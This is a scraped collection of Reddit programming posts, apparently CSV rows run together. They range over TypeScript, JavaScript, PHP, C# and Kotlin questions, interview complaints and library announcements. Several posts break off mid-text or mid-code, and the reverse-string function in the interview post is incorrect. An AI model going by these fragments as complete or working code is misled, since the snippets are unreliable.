    interface InputProps&lt;T&gt; {
        onChange: (update: T) =&gt; void,
        value: T
    };

So the problem I'm running into is I can figure out how to do:  


    function Form&lt;T&gt; (props: PropseWithChildren&lt;InputProps&lt;T&gt;&gt;): ReactElement&lt;any, any&gt; | null {
        return &lt;div&gt;&lt;/div&gt;; // placeholder return
    }

Great, it's functional, it's clean, and perfect.  However it feels wrong since it doesn't implement FunctionComponent.  


I'm trying to figure out the right syntax (and maybe there isn't one) to do:  


    export const Form: React.FunctionComponent&lt;&lt;InputProps&lt;T&gt;&gt; = &lt;T&gt;(props: PropsWithChildren&lt;InputProps&lt;T&gt;&gt;) =&gt; {
        return &lt;div&gt;&lt;/div&gt;; //placeholder return
    }

That always errors and I'm struggling to come up with the correct syntax (or if there even is one) for this.  I tried adding a type parameter to Form (not allowed) and I tried making a type with a default type for T but that just complained because T is still required.  


Is there any way to do what I'm trying to do?  Part of the reason I want the type there is because that type has on it a couple of additional fields which are typed which I want to set (specifically displayName) and I'd like those to stay typed.",I'm stumped and probably trying to do something overly complicated

The team lead wants to upgrade to a ""modern"" solution, but was hoping for something that didn't have a full build stack/framework like React, Angular, Vue, etc, so that the team didn't need to learn a whole new paradigm.

We were hoping for a solution with the following aspects:

- Loading via CDN/local (I realize technically React/Vue/Angular can do this, but is not recommended for prod, just want to avoid build tooling)
- Easy global/scoped variable management
- Easy DOM manipulation/flexible.
- More like a library instead of a framework.

I was hoping for some suggestions on what to look at. I examined AlpineJS, and it worked great for UI elements but managing scoped variables seemed to be difficult. Right now, the next library I hope to look at is UmbrellaJS, but was wondering what other options might be out there.",[AskJS] Replacement options for angularjs

4253,2020-12-14 18:43:51,7,1,"Hello fellow Redditors,
I am a Junior in Computer Science and was given a project to prepare a presentation and implementation of some chosen topic. Now not being interested in ML, AI and all that jazz and with some experience in web development I was looking for choosing a particular web related topic I could do some research in and provide an implementation in this field. 
I have work experience with javascript and have worked in both frontend and backend in some startups. I am at a stage where I am just a pedestal or two above a beginner. Searching through the web most of the results that come up are management systems and website clones. So I was looking for advice regarding some interesting topics that I could do the projects in. 
I am not particularly sure where my core interest lies, built data visulizations in d3, built fullstack apps, worked with mongo built UI in HTML, CSS, built API's in node, tried docker and message queues, aware about concepts of networking and some design patterns, worked in React, Typescript, CLIs, Meteor. Curious about web assembly and PWA's. Any idea related to all of these or topics in the backends like message queues, webserver, http, GRpC would be fine. Here's my [github](https://github.com/ritwizsinha) if anyone needs an idea of my experience level. 

I looked through this sureddit and there was one interesting comment regarding such [projects(https://www.reddit.com/r/webdev/comments/3kyrob/research_topics_relevant_to_web_development/) . 
If anyone could provide some more similar stuff thanks in advance. I have about 3 months for submitting this project and would like to work on something that is both interesting and helps a little bit in getting hired.

I'm trying to find a way to bundle my TS project into a single obfuscated JS file which, alongside node_module folder that could be executed with ""node final-file.js""  

I've been trying to use gulp with gult-typescript and gulp-javascript-obfuscator like so but seems like the obfuscated code can never be ran

```js
const gulp = require( 'gulp' )
const ts = require( 'gulp-typescript' )
const obfuscator = require( 'gulp-javascript-obfuscator' )

let application = ts.createProject( 'tsconfig.json' )

gulp.task( 'build', () =&gt;
{
    let tsResult = application.src()
        .pipe( ts({ outFile : 'final-file.js', module: 'amd' }) )

    return tsResult.js
            .pipe( obfuscator() )
            .pipe( gulp.dest( 'release' ) )
})
```

I really don't care about gulp, if you have a working solution, I'm glad to here it

4262,2020-12-16 16:17:13,1,1,"I am trying to learn basics about Net Core / C# and I am stuck with probably a very silly problem. I am trying simple CRUD operations and everything works fine when I use normal views. But when I try to use partial views with bootstrap modals for adding, editing and deleting, the record gets updated but my page doesn't display it until I refresh the page.

I am assuming second part of this script is messing something but I am even worse at jquery so I can't fix it. Can someone explain to me what causing this issue?

    &lt;script type=""text/javascript""&gt;
        $(function () {
            var placeholderElement = $('#modal-placeholder');
            //$('button[data-toggle=""ajax-modal""]').click(function (event) {
            $(document).on('click', 'button[data-toggle=""ajax-modal""]', function (e) {
                var url = $(this).data('url');
                var decodedUrl = decodeURIComponent(url);
                $.get(decodedUrl).done(function (data) {
                    placeholderElement.html(data);
                    placeholderElement.find('.modal').modal('show');
                });
            })

            placeholderElement.on('click', '[data-save=""modal""]', function (event) {
                event.preventDefault();
                var form = $(this).parents('.modal').find('form');
                var actionUrl = form.attr('action');
                var sendData = form.serialize();
                $.post(actionUrl, sendData).done(function (data) {
                    placeholderElement.find('.modal').modal('hide');
                })
            })
        });
    &lt;/script&gt;

if I add a location.reload() at the end of this script, it does what I want but I lose bootstrap fade effect and it's ugly... I need  a better solution.

here is my codes to update a record:

        [HttpGet]
        public IActionResult Edit(int id)
        {
            var _animal = _db.Animals.Where(x =&gt; x.Id == id).FirstOrDefault();

I have even formatted my computer and the problem still persists, which makes me think something is blocking java script from working.

For example, while browsing this [website.](https://www.myth-weavers.com/showthread.php?p=15293702#post15293702) I can't see the roll tags in java script, and the login won't register what I type in the login boxes. The browser console revealed the following problem.

I started programming since Covid became pandemic. But I am a slow learner, mostly because of a lack of time. At this very moment, I have developed a basic accounting app and I'm finishing an old [ASP.NET](https://ASP.NET) Framework course with a code-first approach. Also, I now learn javascript at work when I have free time. And I have done some SQL, enough to be able to use it. 

My plan was to hurry through this course and then find something with either updating the project to CORE or just a course that covers CORE, simply for me to know the difference. And then check CORE 5, but dont see that essential yet. As I mentioned I have limited time. 

My main goal is to get a job in the UK so I can do this full-time. I love programming, but I feel like I am wasting my time, every time I consider doing something else like [codewars.com](https://codewars.com) or working on my own project. 

I am asking for some guidance on what should I focus on so that I could prove myself a decent recruit. Some mentoring.

I wanted to share my opinion with all of you, i am a nineteen year old datasci student and previously i attended a cisco course where i worked with java, html, css, javascript which by far, in my mind java is the most mangled and non-beginner friendly language. its a very disgusting language and im sure the lads over at r/java would disagree. 

I have only been with python for about 2.5 years. and i can tell you for a fact that its the most relaxing language/thing i have ever done. heck this beats asmr (not that im into it). can i marry python? 

the IDE i started with was Notepad++ for a long time starting with java, then i moved to Atom for a few months and lastly I'm sticking with VSCode. I internwine using it with Anaconda tools and i absolutely love it.

People wake up in the morning and think about what to eat for breakfast, my breakfast, lunch and dinner is python. its so soothing to use. i cannot imagine not using it, ever. even when i retire. python is now apart of me, till death does us part.

how do you feel about using python? :D",Python is the most relaxing language i have ever worked with

* Can PHP do anything javascript/html/css can do?

It was designed to clear as many lines as possible and, therefore, play as long as possible. You can see a javascript implementation [here](https://alecdee.github.io/tetris/index.html).

The AI itself uses a set of metrics that are computed from the tetris board. For example: how many holes there are, or the height of where we want to place the current piece. These metrics are each given a weight and added together to give a board its fitness score.

The AI maps out all possible moves it can make (with the option to add human-like lag), and records the final board states with their scores. The AI then backtracks from these final states to generate a map of the most optimal move to make given any position on the board.

If a new piece is spawned, or the board changes, then a new map is generated. At each frame, the AI looks at the current piece position, looks at the map it has made, and can immediately see what move to make next.",Pure Python Tetris AI

I have also been following tutorials to make small projects like expense manager, typing game etc. 
But I don't feel confident at all. I'm not sure if I'll be able to do stuff without tutorials and how well I understood the concepts. 
I'm learning js only for frontend web development. 
I would like to know if there are any places where I can practice javascript and stuff. And what steps I need to take from here.

4323,2021-01-07 21:00:27,18,0,"Based on advice from past threads on this sub, I started learning PHP from the [Laracasts PHP track](https://laracasts.com/skills/php). I've so far finished the first 15 videos, was just about to start [Routing](https://laracasts.com/series/php-for-beginners/episodes/16) before I took one look at the comments and decided against. it. I've realised for a while now that all I've been doing is watching Jeffrey Way code while occasionally chucking tidbits of learning at you. In this way the Laracasts style of teaching - or the PHP track version of it anyway - essentially seems to be a ""course"" of glorified watch-along-as-I-code videos. 

When it comes to things like syntax and language constructs, there's very little concrete to actually take notes on and make a point of memorising for later use, and 15 videos in I'm annoyed at just how little I've actually learnt about the PHP language and how it works. The course seems to occupy this weird space where it explains the most basic top-level concepts like it's talking to beginners, and then expects you to learn the language itself on-the-fly by watching him code as if you were an experienced programmer. If I hadn't spent the last few months prior to this learning the ins and outs of JavaScript ES6 I would have been ten times as lost as I currently am and probably quit within the first few videos.

With that rant in mind, are there any decent ways to learn modern PHP (7+, 8 would be even better) that aren't Laracasts or PHPTheRightWay (great at what it describes itself as - a reference book - but not really a guide for a beginner programmer). I would prefer something text-based because it's more efficient and easier to take notes on, but will settle for any good video course that I can actually learn the language with. It seems  insane to me that despite PHP being around as long as JavaScript has there are no definitive guides like [EloquentJavaScript](https://eloquentjavascript.net/) or [JavaScript.info](https://javascript.info/) around, at least not that come across.

Thanks in advance to anyone who can help, it would be much appreciated.",Good resource to learn PHP7+ that ISN'T Laracasts?

4325,2021-01-08 08:50:56,5,1,"Hello,

we're generating PDFs for our client. In that generated PDF there are some inputs plus two signatures. Our goal is when the user signs one of the signatures, then we want to lock All or just some of the inputs. There is a checkbox in Adobe Acrobat Reader, which is asking if you want to lock document after signing, but our client does not want to check this checkbox manually, but do it automatically. We know that it's possible, but I cannot find the proper solution. 

&amp;#x200B;

We're using TCPDF library, which is written in PHP. There is no such option to make that signature lock the PDF(investigated source of that library). I assume that I need to make that option to that library - add some options from specification. I found in the officicial specification( [https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdf\_reference\_archive/pdf\_reference\_1-7.pdf](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdf_reference_archive/pdf_reference_1-7.pdf) \- page 695 and lower) ""how"" to do it, or how it is possible, but I cannot make it work. 

&amp;#x200B;

PHP code that is generating signature field in TCPDF library:

&amp;#x200B;

`if (!empty($this-&gt;empty_signature_appearance)) {`

`foreach ($this-&gt;empty_signature_appearance as $key =&gt; $esa) {`

`$actionObj = $this-&gt;_getobj();`

`// widget annotation for empty signature`

`$out = $this-&gt;_getobj($esa['objid']).""\n"";`

`$out .= '&lt;&lt; /Type /Annot';`

`$out .= ' /Subtype /Widget';`

`$out .= ' /Rect ['.$esa['rect'].']';`

`$out .= ' /P '.$this-&gt;page_obj_id[($esa['page'])].' 0 R'; // link to signature appearance page`

`$out .= ' /F 4';`

`//$out .= ' /BS /S';`

`//$out .= ' /BS /U';`

`$out .= ' /FT /Sig';`

`$signame = $esa['name'].sprintf(' [%03d]', ($key + 1));`

`$out .= ' /T '.$this-&gt;_textstring($signame, $esa['objid']);`

`$out .= ' /Ff 0';`

`$out .= ' &gt;&gt;';`

`$out .= ""\n"".'endobj';`

`$this-&gt;_out($out);`

`}`

`}`

&amp;#x200B;

I tried to add to code below:

&amp;#x200B;

`$out .= ' /FT /Sig /Lock 54 0';`

&amp;#x200B;

plus create new object with id 54 0(code bellow should somehow reference to this new created object):

&amp;#x200B;

`$out = $actionObj . ""\n"";`

`$out .= '&lt;&lt;/Action/All/Type/SigFieldLock&gt;&gt;';`

`$out .= ""\n"".'endobj';`

`$this-&gt;_out($out);`

&amp;#x200B;

The 54 0 is $actionObj identifier - I put it statically just to test.

But whatever change I make, the signature dissapears.

There is also some posibility to do some things with javascript, which can be linked on generation time, but then problem with rights appears, because function setLock is protected and cannot be called in my case. Javascript is wrong way I guess, because someone could revert it later if only inputs were marked as readonly. So I will not discuss it this way.

I assume that the way of generating pdf with that functionality in it with /Lock is proper way instead of JS, but I cannot make it really work. I tried to find something on the internet, but nothing works for me. Does anyone here have experience with generating PDFs? Thanks.",PDF generation - lock inputs after signing signature

4334,2021-01-13 10:47:45,20,1,"Hi everyone. When I started my journey I learnt a lot from here and r/learnprogramming and r/reactjs. But since then I have been giving interviews by applying mostly to remote comapnies in Europe and USA now, majorly in my home country (which you might have guessed by now, or maybe look at post history.)

Even at my current workplace I have been handling whole projects on my own building it up with node.js, express.js, react.js, redux, firebase (handling multiple databases in the same app), webRTC,RTM clients. But what hits me the most in such interviews is that they fail me in the first rounds. I'll share the examples of questions which I'm frustrated and tired to answer by now. 

-
```
a = [];
b = [];

console.log(a===b); // if this is false why is it?
```

- 
``` 
- why can we modify a key inside an object which was declared with a const variable?
- how does a javascript event-loop works and more precisely why it never handles setTimeout itself?
```

I have shared many posts in past here, where I have encountered difficult to weird questions in javascript.

I'm crying right now, as I have been taken out of an interview after being asked to write a reverse string question which I solved this way.

```
function CustomReverse(str){
let result = '';
for(let i = str.length-1; i &gt;= 0; i--){
result = result + str;
}
}
```

and after solving this he was like, alright we are looking at someone, team-lead. 

So my major two queries are: 
- how much should I learn Javascript? What exactly should I learn in it? read it or code it or what?

```
I have been reading the whole javascript.info several times and answered almost everything about the promise.all() and how it accepts an array and returns an array of resolved items. 
- promise.resolve();

- how to write custom symbols, iterators. Which I have seriously never used in any of my production app.
```

I have even answered these kind of questions 

```
what is the vaule of this in JS classes?

class BrandCollector {
    get brands() {
        return [
            'Docler',
            'LiveJasmin',
            'Oranum',
            'Google',
            'Apple',
            'Coca-Cola'
        ];
    }

    // The constructor cannot be changed! DO NOT EDIT IT!
    constructor(){
        return this
    }
}


Now my task is to return that array in reversed order without touching the mentioned constrcutor.

some other function is just calling it as 

Array.form(new BrandCollector()).join(',');
```

and could resolve it by writing this in the class without touching the constructor

```
 *[Symbol.iterator] () {
    yield* this.brands.reverse();
  }
```

- the other major query is, is it the same for others as well? I feel these interviews are just getting more hard and harsh, where they ask questions to eliminate the candidate with answer/word? 

- am I intended to write big libraries? which has 100s of downloads on NPM.

I always answer 7 out of 10 questions correctly, that's for sure, no one can deny that. Even if those were hard-difficult, prototype chaining, prototype methods questions.

In an recent interviews, I wrote a function to execute all the tasks(functions) provided to it. It was more like writing a wrapper or a polyfill of Promise.all(), without using any `promises`,`async-await`, callback functions. 

Basically can you tell me as a brother/sister what is going wrong? I am banging my head everyday, that I have had so much of javascript from javascript.info and still it is not getting easier to crack interviews. I mean I know it can never be a cake walk, but at least cut me some slack, this is getting more tough. I hope I don't fall into some disturbance or depression.^(Some times I think I should just create my own sites e.g., blogs, film-news, cricket-news, meme-news, etc. and monetize and earn money on side.)","[AskJS] 139+ interviews failed, I don't know what to improve as a 3 year old developer!!!

4357,2021-01-21 15:28:10,31,1,"Hello there!

So, I was trying to register on 6nomads, and in order to do so, I need to finish test on HackerRank.

HackerRank gives me a simple task like ""Create a GET request to X, read json and get specific information from it"". Sounds easy enought, right?

Since the UI is terrible, I'm using my own IDE. I write a simple HttpURLConnection mechanism to get just to get the result. Yup, it's working. I copy it to the HackerRank, nope. Not working. What's wrong? SSL problems. Ok, lets setup SSL to trust all certificates. It's working, phew.

Now to the hard part of the challenge - parse JSON, read data and get specific data. Hoping that the site can work with JSONObject, GSon or Jackson, I started with first. Did everything, ran locally. Perfect. Everything is working as I thought it should be. Time to Copy paste and finish the test... What's this? JSONObject not found? Strange, but OK. 

Let's try GSon. Locally it's working as expected. HackerRank gives me a middle finger, saying that it doesn't exist. I don't even try with jackson anymore, I just check if I can use that and nope. Nothing. And now I have 30 minutes left.

After googling, if there're any other ways, I find out about javax.script.ScriptEngineManager which I never used and never heard about. Ok. 30 minutes left, I can do this. And guess what, I did. 5 minutes left, let's do this. ""Run tests"" and... 

javax.script.scriptexception: sun.org.mozilla.javascript.internal.ecmaerror: referenceerror: ""Java"" is not defined.

I'm furious and I don't know what to do. I find a link in youtube for hackerrank on java, and they were using just javascript code for it, while I was using ""Java.asJSONCompatible"", because I didn't have much time to get familiar with this ScriptEngineManager. And the end result is - ""Come back when you improve your skills"". Wow, thank you! Turns out if I don't know how to do something the way YOU want, and expect me to understand it in 30 minutes, I'm bad.","Is it me, or HackerRank is terrible?"

4367,2021-01-25 19:43:31,0,1,"Hi all.  I have a class that I'm wanting to use in a few different projects that will mostly be calling some existing stored procedures and doing some other things in EF.

I want the end result service to have two top level classes, Queries and Actions, and then business objects beneath that.  

So an example call would be

    service.Queries.Trucks.GetTruckByVendorId(vendorId)

or

    service.Actions.Invoice.Approve(invoiceId, approverId)


As of now, my class structure is 

Service, which has  Queries and Actions class properties.  Queries and Actions is just a container class to hold each business object(trucks, invoices etc).  I'm injecting a database context into the service, then instantiating the Queries class and Actions class with that context.  Then in each of those classes, I'm using that context to insatiate the business object class and writing the methods there.


This seems dirty to me.  Is there a way I can achieve this structure without having to pass down a db context through all the classes?  Is it safe to do this?  If there is an existing pattern that will let me achieve this, please let me know and I'll look into it.  I come from a mostly frontend background, doing javascript.  So a lot of this stuff is brand new to me.

So I used to do .NET devlopment up until about 2010 where my path got more into databases and moved into being a DBA. That puts me at about .net 3.5.  It seems a lot has changed.

My thought was maybe building a site from top to bottom with web services, a backend sql server instance, and all of the front and middle tier. Do you guys recommend a better approach.  Things I should look out for?

I'm super rusty with everything except for the SQL Server side. Do you have any courses you'd recommend or tutorials/projects to look at?

4380,2021-02-01 07:17:50,24,20,"Hi.

I would like to start by saying that I have had trouble getting on board with typescript.
I wrote vanilla nodejs code, writing backend microservices, for a couple years and it was great. 
However it was also the wild west. It was the highest of highs and the lowest of lows.

Eventually I made the switch over to typescript, but something about it bothered me.
A lot of the people I knew who loved it were using it without setting it to strict. It felt
very easy to not validate input, and believe the type system was going to keep you safe.
I wanted to love it but I couldn't. Having written so much javascript, I felt like my model of the code
was based entirely in the runtime and everywhere I saw an input to the system, a network request, a file read,
standard input, etc, the dreaded ""any"" was there. And validation was there sometimes, when it was convenient,
maybe as part of a spec for an endpoint. But a lot of the time a type was slapped on and people had confidence in 
the correctness of their system. Typescript offers a much better developer experience than javascript.
There's no doubt. The endless blogposts, and convert your react app to use typescript, and your express app to 
nest and so forth leaves little wiggleroom for debate. 

But something left me uneasy.

I remember writing Joi schemas and defining typescript types side by side, and helper functions that would validate
some ""any"" type and return the defined typescript type, and I remember hoping that I kept them in sync, and that 
I hadn't made a mistake.

I longed for something like Go where I could define a type, and json.Unmarshal it and know that at runtime the 
value would have the shape I expected of it. I wanted typescript to feel type-safe to me.

Then I discovered [zod](https://www.npmjs.com/package/zod) in its early stages. It was exactly what I wanted. Something Joi-like, but where I didn't
have to maintain types separately. Where defining the schema also inherently defined the type.
However at the time [zod](https://www.npmjs.com/package/zod) was young. It didn't have the features I wanted, and the test suites weren't there.
It was the vision I had, but something was ever so slightly lacking for me. So I wanted to make my zod. And as a pet
covid project I made [myzod](https://www.npmjs.com/package/myzod). Not very creative I know, and I feel bad for ripping the name so hard.

Last summer I made a couple posts about it, and had a couple gracious users raise some issues and feature requests,
and it's been great learning from that. At this time, I would like to ask anybody who's interested to check it out.

I've recently put some work into making it more client-side friendly. It has better support for user-defined errors,
can collect all errors in an object making it more suitable for tasks such as form-validation, and it's been tweaked
for performance making it one of the faster validation libraries out there 
(at the cost of much code redundancy and complexity as these things sometimes go).

The main advantages over zod as far as I can see it is that the api is simpler, the total size of the dependency is much smaller,
and it is much much more performant. Benchmarking it gives anywhere between 100-150X times faster than zod.

My hopes is that this project can make writing typescript code that is actually type-safe easier.
It's not a perfect project, and there is a lot of room for improvements but I would love feedback.

As a final aside, I don't want anybody to take this post as a slam on zod. It is a great project, has a large community at this point,
and is very deserving.

Thanks for reading.

However that was all around a decade ago. Looking at c#, I recognize syntax patterns and it makes solid sense to me. What brought me back into the hobby, was a scripting project with image recognition and reaction, which I had experience with in the past. 

The problem I have now is the scripting environment is a couple years older, 2017/18. while it is a c# api and compiler, it's having some issues with compiling into a .dll  in visual studio, specifically the error comes from calling from the bitmap type which apparently have since been moved from system.drawing . Wondering what the proper way forward would be, I tried to use nuget and installed and implemented with using on the the system.drawing.core library that is now supposed to house the bitmap and basic image classes.

What's the proper way forward, am I missing a references somewhere or somethimg silly perhaps. Apologize if this is a poor question.",Programming first time in nearly 10 years. Looking for people to kick ideas off

4424,2021-02-22 16:28:36,2,1,"Hello everyone, I'm quite new to plain typescript, I generally use angular but I was tasked with creating a library for plain javascript projects.

My question here is how to do the dependency injection and how to do it in a library. In angular it comes by default, but here I must install one. I checked inversify since it's a popular one but all the tutorials I've seen are directed to node.js. 

In all those tutorials there is a main.ts which is where the injectables are created but in my case since I have a library I think I shouldn't create a main.ts since I don't want to call it from the main project. What am I doing wrong and has anyone ever surpassed this issue?

4425,2021-02-22 20:01:18,3,1,"Hi everybody, I recently started a new job in a small company where everyone is computer illiterate, and I'm trying to make a good impression by streamlining their workflow and making it more efficient.
One of the ideas I had was to build an Excel table with all current projects, where they can each write updates on their progress or add notes. A very important part of that is keeping track of when a project was last updated, so I'm looking for a way to have a cell automatically add a timestamp when another cell's value has changed.

I know there's a way to do that using VBA in Excel, but they only use Office 365 which only supports TypeScript. I don't know a thing about coding, and after a few hours [going](https://docs.microsoft.com/en-gb/office/dev/scripts/overview/excel) [over](https://docs.microsoft.com/en-gb/office/dev/scripts/tutorials/excel-tutorial) [the](https://docs.microsoft.com/en-gb/office/dev/scripts/develop/scripting-fundamentals) [documentation](https://docs.microsoft.com/en-gb/javascript/api/office-scripts/excel/excel.worksheet), I couldn't make heads or tails of it and decided it's time to ask for help.

tl;dr I need help writing a macro for Excel for web that automatically inputs the date and time when a cell has been changed.

Any assistance at all will be very much appreciated!
Thank you!",Please help! I can't figure this out
4426,2021-02-22 23:26:58,3,1,"Hello r/javascript! Long-time lurker here with a question for my first post. While this is a question, I'm hoping to spark a more general discussion of tradeoffs rather than get a direct answer. That said, if this is more suitable for r/learnjavascript, I would be happy to post it over there instead. Onto the question itself...

Per the title, I'm wondering what the performance cost of using Javascript to do some light DOM Manipulation like adding classes to elements based on certain conditions is? This article offered some good insight but didn't address the context of just adding a class to a node in the element tree.

To offer better context, I work with WordPress often, but I still find it easier to do some things with JavaScript than PHP. In this particular instance, I've got a function that returns a post in a certain area on the page. If there is no post, I would like to simply hide that area entirely. My thought was to use JS to evaluate if the element has innerHTML length &gt; 0 and if it doesn't, add a class to the element featuring a display: none so that it will become hidden.

In typing this, I can see how the same approach could easily be taken in PHP and will just do that. That said, I feel like similar situations often arise where I just want to use some (hacky feeling) JavaScript to get the job done but I wonder if it will be bad for performance on such a level that it should be avoided? What do you all think? Thanks in advance for any input offered!",[AskJS] Performance Cost of Light DOM Manipulation?

4442,2021-03-05 07:09:16,10,1,"I have a couple job offers that are in golang and 1 in kotlin. I have about 2-3 years of experience with golang, but no experience with jvm languages. (Also have some python experience). Curious about how much time it would take to learn kotlin on the job, especially from those that transitioned without much jvm experience.

I'm trying to improve my work life balance (preferably not much more than 40 hours a week average including learning), and want to focus on building things over learning languages to be honest, and afraid it will take a significant amount of time to ramp up with kotlin. I've heard great things about kotlin, esp from java engineers, but my concern is not with how awesome the language is, but with the amount of effort it would take to learn it all. More to explain this next.

There are lots of constructs and operators that look quite foreign to me (see code snippet below), and I'm wondering how much Java would I also have to learn in addition (due to java libraries), as kotlin seems somewhat connected to java. Lastly, I'd also need to learn intellij or some other IDE, as I've lived in the VIM world for a few years. That is to say, lots and lots to learn, an entire ecosystem. Gotta also learn the build systems, etc... like gradle? It seems like tons to learn and months of work (inside and outside of working hours).

How much time can I expect it take to onboard with kotlin to a proficient level? This is assuming I learn during work hours and don't have weekends and weeknights to learn the language. I'm a bit concerned b/c I prefer to hit the ground running a bit faster, as all offers are for senior level positions. I'm early 30's with about 3-4 years of experience as a developer (previously SRE/devops).

I was a bit intimidated by looking at just ""two sum"" on leetcode (ie. really simple code). I could barely understand it without spending a few minutes googling stuff. Wrote some comments with some thoughts.

&amp;#x200B;

    class Solution {
        fun twoSum(nums: IntArray, target: Int): IntArray {
            
            // wow, really prefer golang and python literals or constructs.
            // e.g. m := make(map[string]int) or 
            // map[string]int{&lt;...&gt;}
            val diffMap = mutableMapOf&lt;Int, Int&gt;()
            
            // for each element? (index, and int), similar to python enumerated
            // why are there so many camel case methods or functions? 
            nums.forEachIndexed { index, int -&gt; 
                
                // if the integer exists within the diffMap, return the indices. 
                diffMap[int]?.let { // let is kind of funky. looks like javascript.
                    return intArrayOf(it, index) // ""it"" is like a lambda variable? so weird to do this just to get the value from a map. 
                }
                
                // add diff to map
                // I really like this. No extra camel case function to learn.
                // This is the only part of the code that seems similar to python/golang. 
                diffMap[target - int] = index   
            }
            
            // wish this was just ""[]"". miss the literal slices in golang and python.
            return intArrayOf()
        }
    }

Lastly, kotlin doesn't look to be that popular yet.  I still find it quite risky, especially if kotlin isn't that similar to java (?), and doesn't reduce the amount of work needed to learn java, which I'd have to do if I needed to go to a large megacorp in my area (SF/Bay)

Am I being too opinionated? Am I being accurate in that there will be a ton to learn though? Anyone share my thoughts?

Use case: I use spring boot and jooq to develop web applications and I need to create audit logs of CUD operations. For update operation, I want to get object diff from user, update the corresponding row in database and log that diff in my audit log table. So I need to distinguish between fields which are set to null and fields which are unset and not a part of update.
I currently solved this problem by adding an extra boolean field that indicates the actual field's presence and set it to true in corresponding field's setter using annotation peocessor and then use reflection to check if the field is unset.

I get why for .. in loops aren't recommended, but if i++ is not allowed, I don't know a better way to write a for loop. Maybe i += 1 instead of i++? It feels odd since I've been using i++ for the past six years without any problems.

4481,2021-04-07 15:57:29,29,1,"Dear all, 

I am struggling to create a nice looking desktop GUI as I only know python it is getting tough. I came to know I need to either use Tkinter or PyQT for makikg a GUI. Although I liked PyQT but it is commercial (I think). Tkinter is awesome but it looks very old. 
Is it possible to create nice looking GUI in python? My aim is to make something like https://molstar.org/viewer/ as a standalone GUI. Although it seems very tough for me to understand TS/JS to connect with it. But is it (javascript/Typescript) also a viable alternative to GUI? By with some magix bridge between python and Ts/Js?",Modern GUI by python (Is Tkinter is the only option?)
4482,2021-04-07 16:10:51,6,1,"Link: https://github.com/keleshev/compiling-to-assembly-from-scratch/blob/main/contrib/python/compiler.py

Hey folks, this is a small compiler (~800 lines including tests) that compiles a simple programming language to ARM assembly. It is adapted from my book [Compiling to Assembly from Scratch](https://keleshev.com/cas), but I believe it has educational value even without the book, so check it out! Happy to answer any questions.

For example, it compiles the following code:

```javascript
function factorial(n) {
  if (n == 0) {
    return 1;
  } else {
    return n * factorial(n - 1);
  }
}
```

Into the following ARM assembly:

```arm
.global factorial
factorial:
  push {fp, lr}
  mov fp, sp
  push {r0, r1}
  ldr r0, =0
  push {r0, ip}
  ldr r0, [fp, #-8]
  pop {r1, ip}
  cmp r0, r1
  moveq r0, #1
  movne r0, #0
  cmp r0, #0
  beq .L1
  ldr r0, =1
  b .L2
.L1:

4493,2021-04-15 14:29:20,12,1,"I'm new so I know I'm asking a simple question, but I seem to be missing an important assumption/idea, but I don't know what it is. 

I'm learning for...of loops today and here's the example I'm working on: 

const subreddits = [""cringe"", ""cats"", ""dogs"", ""javascript]

for (let sub of subreddits) {
       console.log(""sub"")
}


How does Javascript know that sub is referring to the values in the array? Is it because it's the only possible thing that it could be referring to? I feel like my brain doesn't quite understand why I don't have to define each of those values. How does it know what sub is when I haven't assigned anything to sub? 

I'm not sure if this question makes sense, or maybe seems extremely obvious, or maybe I'm correct and it's because it's the only thing it can possible refer to. 

I feel like there's a step missed out, but there isn't. Does feeling as if there's a step missing make any sense to those of you who have a good grasp of JS?

My goal is to restrict access to almost everything, except for exposed API. No access to global scope/window/document etc. Just the provided set of functions.

If you have a minute to spare i would like you to try break this thing. There are only 3 functions available in sandbox right now - console.log (actually all console.\* methods), draw\_rect(x, y, w, h) and get\_foo(). All the other stuff is hidden. See if you can to access anything else with some clever tricks.

Code is executed automatically after you enter it in the test enviroment - [http://labs.onether.com/javascript-sandbox/](http://labs.onether.com/javascript-sandbox/) (check out dev console for errors)

Im currently following this tutorial: [https://docs.microsoft.com/en-us/azure/developer/javascript/tutorial/single-page-application-azure-login-button-sdk-msal](https://docs.microsoft.com/en-us/azure/developer/javascript/tutorial/single-page-application-azure-login-button-sdk-msal) 

As of now I am using a simple cookie that is set whenever the user logs on. And it is deleted when the user logs off. And so if the cookie is not set, the user will not be able to view the page (beyond the login screen). Is this a decent way of doing it? Or should I use something else when it comes to microsoft authentication?   
Because if the user logs on the page with his microsoft account, and the cookie is set, the user will of course get to the page. However, if the user then manually deletes the cookie, he will then no longer be able to view the page even though he is technically logged in with his microsoft account.. so im quite unsure if using cookies is the best way to handle this.

                 socket_close($client);
                 socket_close($socket);

in the browser console i enter the code below after calling websocket.php through ajax or by  visiting it to in the url 

                  const ws= new WebSocket(""ws://localhost:8082""); ws.onmessage = function(msgevent) { var msg =msgevent.data; console.log(msg); };

i thought i could do it by new WebSocket(""ws://localhost:8082/websocket.php""); but no nginx needs special tiddling for that. 

what i accomplished is a long running websocket loop that won't close, well it does  but that is by some timeout from nginx or pĥp, as to which i can't tell  

anyway supposed the client browser gets nuked, how can i detect that and break the messaging loop? 

 ajax long pulling has never looked more preferable currently. do folk actually use php websocket? why couldn't i find decent book or a tutorial without it relying on some fancy library?",how to know from back end when client websocket connection gets terminated?

I don't really understand how to apply this method to my code, but I'm trying to have dark-mode persist through pages I toggle it on, until I toggle it again on another page.


```

function myFunction() {

   var element = document.body;

   element.classList.toggle(""dark-mode"");

}

```


This is my current code to get the page to be dark.


And this is how I'm linking it on each page: `&lt;script src=""javascript/dark-mode.js""&gt;&lt;/script&gt;`


I have a button on each page that toggles the dark mode, but when someone navigates to another page, the dark-mode is no longer active. I want it to stay on, until it's toggled again.


Here's my button code just to show how I set it up: `&lt;button id=""toggle"" title=""Toggle Dark Mode"" onclick=""myFunction()""&gt;Lights On/Off&lt;/button&gt;`


Please describe to me how I would accomplish this, and treat me as if I never done this before...because I haven't.


Thanks!","[AskJS] Persistent dark-mode, please help me..."

